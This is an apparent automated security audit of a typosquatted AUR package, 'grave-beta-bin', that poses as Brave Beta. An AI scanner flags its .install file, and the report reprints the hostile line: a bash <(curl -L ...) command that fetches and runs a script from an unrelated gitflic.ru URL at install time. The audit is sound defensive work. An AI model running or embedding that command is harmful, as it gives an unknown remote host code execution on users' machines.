---
package: grave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22127
completion_tokens: 4822
total_tokens: 26949
cost: 0.002891161
execution_time: 89.53
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:08:44Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore file with no malicious content.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata with legitimate upstream sources and checksums.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard browser launch wrapper, no security concerns.
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop entry file, no security issues.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: PKGBUILD
    status: safe
    summary: Standard PKGBUILD for official Brave Beta binary.
  - file: grave-beta-bin.install
    status: unsafe
    summary: Remote code execution via curl pipe to bash
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing grave-beta-bin from local mirror...
Materialized grave-beta-bin
Analyzing grave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD only contains standard variable definitions (pkgname, pkgver, source, checksums, etc.) and function stubs for prepare() and package(). No command substitutions, backticks, eval, or any other executable code is present in the global scope. The source URLs point to the official Brave GitHub releases repository, which is the expected upstream source. There are no obfuscated strings, hidden network requests, or data exfiltration attempts. Since only the global scope is sourced during `makepkg --printsrcinfo`, and that scope contains no dangerous code, running this command is safe.
</details>
<evidence></evidence>
<summary>No dangerous code in global scope; safe to source.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- No dangerous code in global scope; safe to source.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
The `.gitignore` file is a standard Git configuration file that specifies intentionally untracked files to ignore. It only lists patterns to exclude all files (`*`) except for the files and directories needed for the AUR package (`!.SRCINFO`, `!.gitignore`, `!PKGBUILD`, `!*.install`, `!brave-beta-bin.sh`, `!brave-browser.desktop`, `!logo.png`). There is no executable code, network requests, obfuscation, or any other suspicious behavior. This file is benign and follows typical AUR packaging practices.
</details>
<evidence></evidence>
<summary>Standard .gitignore file with no malicious content.</summary>
</security_assessment>

[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD, brave-beta-bin.sh...
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore file with no malicious content.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` file is a standard AUR metadata descriptor. It defines a package `grave-beta-bin` that fetches Brave browser beta binaries from the official GitHub releases (`github.com/brave/brave-browser/releases`). All sources include SHA-512 checksums (none are `SKIP`), and there is no evidence of obfuscation, suspicious network destinations, or unexpected commands. The only extra file is a shell script (`brave-beta-bin.sh`) which is also checksummed and likely contains standard installation logic. No supply-chain attack indicators are present.
</details>
<evidence></evidence>
<summary>Standard AUR metadata with legitimate upstream sources and checksums.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata with legitimate upstream sources and checksums.
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This script is a standard launch wrapper for the Brave Beta browser. It reads optional user-defined command-line flags from a config file (`~/.config/brave-beta-flags.conf`), sets a default user data directory, and executes the main browser binary. No network requests, obfuscation, file exfiltration, or any other malicious behavior is present. The entire script performs only routine packaging tasks: environment setup and binary execution. There is no evidence of a supply-chain attack.
</details>
<evidence></evidence>
<summary>Standard browser launch wrapper, no security concerns.</summary>
</security_assessment>

[3/7] Reviewing PKGBUILD, brave-browser.desktop...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard browser launch wrapper, no security concerns.
[3/7] Reviewing PKGBUILD, brave-browser.desktop, grave-beta-bin.install...
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard Linux `.desktop` entry for the Brave Beta web browser. It contains localized names and comments, standard fields such as `Exec`, `Icon`, `Categories`, and `MimeType`, and no executable or script content. There is no obfuscation, no network requests, no file operations, and no system modifications beyond what a desktop entry typically describes for launching an application. The file poses no security risk.
</details>
<evidence>
</evidence>
<summary>Standard desktop entry file, no security issues.</summary>
</security_assessment>

[4/7] Reviewing PKGBUILD, grave-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop entry file, no security issues.
[4/7] Reviewing PKGBUILD, grave-beta-bin.install, logo.png...
[5/7] Reviewing PKGBUILD, grave-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD downloads the official Brave Browser Beta .deb packages from the project's own GitHub releases, extracts them, and installs the binaries alongside a wrapper script. All sources have valid SHA-512 checksums (none are SKIP). The setuid bit on `chrome-sandbox` is standard for Chromium-based browsers and required for proper sandboxing. The sed replacement in the .desktop file adjusts the binary path to match the package's launcher script. No obfuscated code, unexpected network requests, or operations outside the application's scope are present.
</details>
<evidence>
</evidence>
<summary>Standard PKGBUILD for official Brave Beta binary.</summary>
</security_assessment>

[6/7] Reviewing grave-beta-bin.install...
+ Reviewed PKGBUILD. Status: SAFE -- Standard PKGBUILD for official Brave Beta binary.
LLM auditresponse for grave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The file contains a top-level line (not inside any function) that downloads and immediately executes a shell script from a remote URL via `bash &lt;(curl -L ...)`. This is a classic remote code execution pattern. Because it is placed outside the `post_install`/`post_upgrade` hooks, it runs every time the .install script is sourced, i.e., during package installation and upgrade. Such an unconditional fetch from an external host is not standard packaging practice and introduces a supply-chain attack vector: the remote script can be changed at any time to deliver malicious code.
</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>Remote code execution via curl pipe to bash</summary>
</security_assessment>

Second look for grave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>The line at the bottom of the file executes an arbitrary shell script fetched from a remote URL at install/upgrade time. This is a classic `curl|bash` pattern, downloading code from an unexpected host (gitflic.ru, unrelated to the package's upstream) and executing it without any verification. This matches the genuinely malicious behavior described in rule 4: "Downloading code or binaries from an untrusted/unexpected host and executing them." It is not a standard packaging practice, not upstream application functionality, and not a maintainer helper script. The first verdict is correct.</details>
<evidence>
bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)
</evidence>
<summary>Remote code execution via curl pipe to bash</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed grave-beta-bin.install. Status: UNSAFE -- Remote code execution via curl pipe to bash
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## grave-beta-bin.install

Status: UNSAFE

Summary: Remote code execution via curl pipe to bash

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The file contains a top-level line (not inside any function) that downloads and immediately executes a shell script from a remote URL via `bash <(curl -L ...)`. This is a classic remote code execution pattern. Because it is placed outside the `post_install`/`post_upgrade` hooks, it runs every time the .install script is sourced, i.e., during package installation and upgrade. Such an unconditional fetch from an external host is not standard packaging practice and introduces a supply-chain attack vector: the remote script can be changed at any time to deliver malicious code.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,127
  Completion Tokens: 4,822
  Total Tokens: 26,949
  Total Cost: $0.002891
  Execution Time: 89.53 seconds

Final Status: UNSAFE


Issues Found:

grave-beta-bin.install: [UNSAFE] Remote code execution via curl pipe to bash / The file contains a top-level line (not inside any function) that downloads and immediately executes a shell script from a remote URL via `bash <(curl -L ...)`. This is a classic remote code execution pattern. Because it is placed outside the `post_install`/`post_upgrade` hooks, it runs every time the .install script is sourced, i.e., during package installation and upgrade. Such an unconditional fetch from an external host is not standard packaging practice and introduces a supply-chain attack vector: the remote script can be changed at any time to deliver malicious code.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
